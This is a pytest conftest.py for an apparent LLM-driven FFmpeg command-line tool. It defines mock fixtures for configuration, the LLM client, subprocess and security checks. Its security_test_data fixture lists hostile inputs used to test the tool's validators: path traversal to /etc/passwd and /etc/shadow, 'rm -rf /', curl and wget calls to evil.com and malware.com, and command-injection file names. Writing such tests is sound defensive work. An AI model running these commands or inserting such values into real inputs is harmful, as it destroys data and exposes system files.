"""Test configuration and shared fixtures for ai-ffmpeg-cli.

This module provides shared test fixtures, configuration, and utilities
that can be used across all test modules.
"""

import os
import tempfile
from pathlib import Path
from unittest.mock import Mock
from unittest.mock import patch

import pytest

from ai_ffmpeg_cli.config import AppConfig
from ai_ffmpeg_cli.intent_models import Action
from ai_ffmpeg_cli.intent_models import FfmpegIntent
from ai_ffmpeg_cli.llm_client import LLMClient


@pytest.fixture
def temp_dir():
    """Create a temporary directory for test files."""
    with tempfile.TemporaryDirectory() as temp_dir:
        yield Path(temp_dir)


@pytest.fixture
def sample_video_files(temp_dir):
    """Create sample video files for testing."""
    video_files = []
    for i in range(3):
        video_file = temp_dir / f"video_{i}.mp4"
        video_file.write_text(f"fake video content {i}")
        video_files.append(video_file)
    return video_files


@pytest.fixture
def sample_audio_files(temp_dir):
    """Create sample audio files for testing."""
    audio_files = []
    for i in range(2):
        audio_file = temp_dir / f"audio_{i}.mp3"
        audio_file.write_text(f"fake audio content {i}")
        audio_files.append(audio_file)
    return audio_files


@pytest.fixture
def sample_image_files(temp_dir):
    """Create sample image files for testing."""
    image_files = []
    for i in range(2):
        image_file = temp_dir / f"image_{i}.jpg"
        image_file.write_text(f"fake image content {i}")
        image_files.append(image_file)
    return image_files


@pytest.fixture
def mock_config():
    """Create a mock configuration for testing."""
    config = Mock(spec=AppConfig)
    config.model = "gpt-4o"
    config.dry_run = True
    config.timeout = 60
    config.allowed_dirs = [Path("/tmp")]
    config.assume_yes = False
    config.verbose = False
    config.output_dir = None
    return config


@pytest.fixture
def mock_llm_client():
    """Create a mock LLM client for testing."""
    client = Mock(spec=LLMClient)
    client.parse.return_value = FfmpegIntent(
        action=Action.convert,
        inputs=[Path("test.mp4")],
        output=Path("output.mp4"),
        format="mp4",
    )
    return client


@pytest.fixture
def sample_intent():
    """Create a sample FFmpeg intent for testing."""
    return FfmpegIntent(
        action=Action.convert,
        inputs=[Path("input.mp4")],
        output=Path("output.mp4"),
        format="mp4",
        video_codec="libx264",
        audio_codec="aac",
    )


@pytest.fixture
def mock_context():
    """Create a mock context for testing."""
    return {
        "videos": ["/path/to/video1.mp4", "/path/to/video2.mov"],
        "audios": ["/path/to/audio1.mp3"],
        "images": ["/path/to/image1.jpg"],
        "most_recent_video": "/path/to/video1.mp4",
    }


@pytest.fixture
def cli_runner():
    """Create a CLI runner for testing."""
    from typer.testing import CliRunner

    return CliRunner()


@pytest.fixture
def mock_ffmpeg():
    """Mock FFmpeg execution."""
    with patch("subprocess.run") as mock_run:
        mock_run.return_value.returncode = 0
        mock_run.return_value.stdout = b"FFmpeg output"
        mock_run.return_value.stderr = b""
        yield mock_run


@pytest.fixture
def mock_openai():
    """Mock OpenAI API calls."""
    with patch("openai.OpenAI") as mock_client_class:
        mock_client = Mock()
        mock_client.chat.completions.create.return_value.choices[
            0
        ].message.content = (
            '{"action": "convert", "inputs": ["test.mp4"], "output": "output.mp4", "format": "mp4"}'
        )
        mock_client_class.return_value = mock_client
        yield mock_client


@pytest.fixture
def mock_file_system(temp_dir):
    """Mock file system operations."""
    with (
        patch("pathlib.Path.exists", return_value=True),
        patch("pathlib.Path.is_file", return_value=True),
        patch("pathlib.Path.is_dir", return_value=False),
    ):
        yield


@pytest.fixture
def mock_user_input():
    """Mock user input for interactive tests."""
    with patch("builtins.input", return_value="y"):
        yield


@pytest.fixture
def mock_logging():
    """Mock logging for tests."""
    with patch("ai_ffmpeg_cli.logging_config.config.setup_logging"):
        yield


@pytest.fixture
def test_environment():
    """Set up test environment variables."""
    original_env = os.environ.copy()
    os.environ["OPENAI_API_KEY"] = "test-api-key"
    os.environ["AICLIP_CONFIG_DIR"] = str(Path.cwd() / "test_config")
    yield
    os.environ.clear()
    os.environ.update(original_env)


@pytest.fixture
def mock_credential_security():
    """Mock credential security functions."""
    with (
        patch(
            "ai_ffmpeg_cli.credential_security.validate_api_key_format",
            return_value=True,
        ),
        patch("ai_ffmpeg_cli.credential_security.mask_api_key", return_value="sk-***"),
    ):
        yield


@pytest.fixture
def mock_path_security():
    """Mock path security functions."""
    with (
        patch("ai_ffmpeg_cli.path_security.is_safe_path", return_value=True),
        patch("ai_ffmpeg_cli.path_security.validate_ffmpeg_command", return_value=True),
    ):
        yield


@pytest.fixture
def performance_test_data():
    """Create test data for performance tests."""
    return {
        "large_video": b"x" * (100 * 1024 * 1024),  # 100MB
        "many_files": [f"file_{i}.mp4" for i in range(1000)],
        "complex_intent": FfmpegIntent(
            action=Action.convert,
            inputs=[Path(f"input_{i}.mp4") for i in range(10)],
            output=Path("output.mp4"),
            format="mp4",
            video_codec="libx264",
            audio_codec="aac",
            filters=["scale=1920:1080", "fps=30"],
        ),
    }


@pytest.fixture
def security_test_data():
    """Create test data for security tests."""
    return {
        "dangerous_paths": [
            "../../../etc/passwd",
            "..\\..\\windows\\system32",
            "/etc/shadow",
            "C:\\Windows\\System32\\cmd.exe",
        ],
        "dangerous_commands": [
            ["rm", "-rf", "/"],
            ["curl", "http://evil.com"],
            ["wget", "http://malware.com"],
        ],
        "injection_attempts": [
            "input.mp4; rm -rf /",
            "input.mp4 | curl evil.com",
            "input.mp4 && wget malware.com",
        ],
    }


# Test markers for different test categories
def pytest_configure(config):
    """Configure pytest with custom markers."""
    config.addinivalue_line("markers", "unit: mark test as a unit test")
    config.addinivalue_line("markers", "integration: mark test as an integration test")
    config.addinivalue_line("markers", "e2e: mark test as an end-to-end test")
    config.addinivalue_line("markers", "performance: mark test as a performance test")
    config.addinivalue_line("markers", "security: mark test as a security test")
    config.addinivalue_line("markers", "slow: mark test as slow running")
    config.addinivalue_line("markers", "fast: mark test as fast running")


# Test collection configuration
def pytest_collection_modifyitems(config, items):
    """Modify test collection to add markers based on file location."""
    for item in items:
        # Add markers based on test file location
        if "unit/" in str(item.fspath):
            item.add_marker(pytest.mark.unit)
        elif "integration/" in str(item.fspath):
            item.add_marker(pytest.mark.integration)
        elif "e2e/" in str(item.fspath):
            item.add_marker(pytest.mark.e2e)
        elif "performance/" in str(item.fspath):
            item.add_marker(pytest.mark.performance)
        elif "security/" in str(item.fspath):
            item.add_marker(pytest.mark.security)

        # Add speed markers based on test name
        if "performance" in item.name or "load" in item.name or "memory" in item.name:
            item.add_marker(pytest.mark.slow)
        else:
            item.add_marker(pytest.mark.fast)
